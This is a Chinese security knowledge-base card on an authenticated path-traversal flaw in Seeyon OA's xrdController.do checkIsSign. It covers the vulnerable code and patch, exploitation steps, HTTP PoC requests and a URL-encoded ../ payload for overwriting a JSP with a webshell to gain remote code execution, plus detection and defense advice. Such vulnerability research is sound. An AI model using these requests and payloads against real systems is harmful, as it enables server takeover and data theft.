---
id: web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal
title: 致远 OA xrdController.do checkIsSign 文件名目录穿越：覆盖已有 JSP 致 RCE
type: scenario
domain: web
path: web/java/component
technique: seeyon-xrdcontroller-filename-path-traversal-file-overwrite
tags:
- java
- seeyon
- oa
- path-traversal
- arbitrary-file-write
- jsp
- rce
- authenticated
cve: []
severity: high
confidence: medium
affected_versions: 原文补丁列表覆盖 V5_V7.x、V8.0、V8.0SP1、V8.0SP2、V8.1、V8.1SP1、V8.1SP2、V8.2–V9.0；测试环境 A8-v8.2SP1
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:18:38+08:00'
  notes: 已对照原文及14张图核对：图01补丁列表（V5_V7.0SP3、V5_V7.1/G6V7.1/G6N4.0、V5_V7.1SP1等、V5_V8.0/SP1/SP2-LTS、V5&G6&N_V8.1/SP1/SP2、V8.2-V9.0）；图02-03确认漏洞版fileName仅URLDecoder后拼接、补丁版Strings.getCanonicalPath(...).getName()；图04-07确认summaryId/attList、createDir/decrypt/getFile；图08确认/xrdController.do bean；图09-10确认fileUpload processUpload返回fileid；图11确认双fileName穿越限制；图12-14确认checkIsSign请求、覆盖robots.txt与WebShell回显(FileRoot/CurrentUser charming)。affected_versions 保留作者按补丁列表的汇总（原文表另含G6/G6N各版，卡内以V5层级概括）。未验证点：原文最终JSP路径与文件名被模糊处理，PoC需按目标路径调整；原文要求登录；未本机复跑；frontmatter无source_url。
url: /docs/web/java/component/web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal/
draft: false
kb_aliases:
- 致远 OA 文件复制漏洞
- Seeyon xrdController.do 目录穿越
- checkIsSign fileName 路径穿越
- CopyFile 文件复制漏洞
- 致远 OA 任意文件覆盖
---

## 一句话结论

致远 OA A8 的 `/seeyon/xrdController.do?method=checkIsSign` 从 `attList` 中取文件名后只做 URL 解码就拼进复制路径，攻击者登录后先通过 `fileUpload.do` 上传任意内容拿到 fileid，再用带 `../` 的文件名让服务端把上传内容写到 `xrd` 目录之外；当目标位置存在可覆盖的 JSP 文件时，可写入 WebShell 并访问触发 RCE。

## 原理

- 路由：Spring bean `name="/xrdController.do"` 对应 `com.seeyon.apps.trustdoDx.node.controller.XrdController`，`method=checkIsSign` 分发到 `checkIsSign(HttpServletRequest, HttpServletResponse)`。
- 参数：`summaryId` 和 `attList`。`attList` 先按 `,` 拆成多个附件，每项再按 `$` 拆成 `fildData[0]`（fileid）与 `fildData[1]`（文件名）；文件名只做 `URLDecoder.decode(fileName,"UTF-8")`。
- 漏洞代码：
  ```java
  CtpFile file = this.fileManager.getFile(Long.parseLong(fildData[0]), new Date());
  String fileName = URLDecoder.decode(fildData[1], "UTF-8");
  String copyPath = file.getParent() + File.separator + "xrd" + File.separator + fileName;
  CtpLocalFile f = new CtpLocalFile(copyPath);
  if (!f.exists()) { FileUtil.createDir(copyPath); }
  CtpLocalFile output = new CtpLocalFile(copyPath + File.separator + fileName);
  FileUtil.decrypt(file, output);
  ```
  `fileName` 未做 `../`、绝对路径或规范化校验，`copyPath` 与 `output` 都受其影响；`FileUtil.decrypt` 把上传文件内容写到 `output`，形成目录穿越写文件。
- 路径构造的约束：`output = file.getParent()/xrd/<fileName>/<fileName>`，同名的两段会互相抵消一部分穿越，导致直接写入 Web 根目录时多出一层目录；原文的绕过思路是“覆盖已存在的文件”：当目标文件存在且非空时，`createDir` 跳过，`output` 直接写入该文件；若目标为空文件，则先建同名目录再写文件会失败。
- 补丁把 `fileName` 改为 `new File(Strings.getCanonicalPath(fileName)).getName()`，先规范化再取 basename，剥离所有路径分隔与 `..`，从而阻断穿越。

## 触发条件

- 目标为受影响的致远 OA 版本（原文测试 A8-v8.2SP1；补丁列表覆盖 V5_V7.x、V8.0/SP1/SP2、V8.1/SP1/SP2、V8.2–V9.0）。
- 攻击者拥有有效登录会话（原文明确“复现漏洞需要登录”）。
- `fileUpload.do?method=processUpload` 可用，能上传文件并返回 fileid。
- 目标 Web 目录存在可覆盖的 JSP 文件（未被访问/无缓存），且进程对目标文件有写权限；原文指出致远 Web 目录未做热加载，已被访问过的 JSP 有缓存，覆盖后不会重新加载。

## 利用步骤

1. 登录致远 OA，抓取会话 Cookie。
2. 通过上传接口上传任意内容（如 JSP WebShell 文本），记录响应中的 fileid：
   ```http
   POST /seeyon/fileUpload.do?method=processUpload&type=0&firstSave=true&inputId=localImport&applicationCategory=1&extensions=txt&quantity=1&maxSize=52428800&isEncrypt=false&popupTitleKey=&attachmentTrId=poiLocalImport&callMethod=localImportPortalPackgeCallBack
   ```
3. 构造 `attList={fileid}${filename}`，filename 使用 URL 编码的 `../` 穿越序列，指向一个已存在、未被访问的 JSP 文件；请求：
   ```http
   GET /seeyon/xrdController.do?method=checkIsSign&summaryId=123&attList={fileid}${filename}
   ```
4. 服务端把上传内容复制/解密写入目标 JSP；若目标路径正确，响应正常。
5. 访问被覆盖的 JSP，执行写入的 WebShell 代码获取命令执行（原文截图展示 FileRoot C:\、CurrentUser charming 等命令回显）。
6. 如果目标 JSP 已被访问过（缓存），换一个未被访问的 JSP；也可先写入非 JSP 文件（如 robots.txt）验证写入成功，再寻找 JSP 覆盖目标。

## PoC

```http
GET /seeyon/xrdController.do?method=checkIsSign&summaryId=123&attList={fileid}${filename} HTTP/1.1
Host: target
RequestType: AJAX
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: JSESSIONID=<session>
```

其中 `{fileid}` 为 `processUpload` 返回值，`{filename}` 为 URL 编码的穿越路径（原文为虚构示例，实际需按目标安装路径调整层数）：

```text
..%2f..%2f..%2f..%2f..%2fsee%2fApa%2fweb1%2fsee%2ftest
```

原文以覆盖已有文件的方式写入内容，并通过访问被覆盖的 JSP 获得命令执行；具体 JSP 路径与文件名在原文中被模糊处理。

## 变体与关联

- 变体：仅做任意文件覆盖（不要求 JSP），可覆盖配置文件、静态资源等，造成内容篡改或配置污染。
- 变体：路径层数与 `xrd` 目录深度有关，需按目标 `file.getParent()` 实际路径调整 `../` 数量。
- 关联：[[web-java-component-seeyon-autoinstall-login-locale-zip-traversal]]（同产品另一处路径穿越，Cookie 任意 ZIP 下载）；[[web-generic-file-upload-web-generic-file-upload-mes-uploadfilename-arbitrary-jsp]]（文件名穿越写 JSP 的同类场景）。

## 检测与防御

- 检测：`xrdController.do?method=checkIsSign` 请求的 `attList` 中出现 `%2f`、`..`、绝对路径或异常长文件名；上传后紧接同一 fileid 的 checkIsSign 调用；Web 目录 JSP 文件被异常改写。
- 防御：升级官方 CopyFile 补丁；对 `fileName` 使用 `getCanonicalPath` 后取 `getName()`，并校验最终路径必须位于允许的 `xrd` 目录内。
- 防御：上传文件与复制操作分离权限，复制目标路径白名单化；Web 目录禁止运行时可写。
- 防御：限制 `fileUpload.do`/`xrdController.do` 的访问角色与来源；监测 JSP 文件完整性。
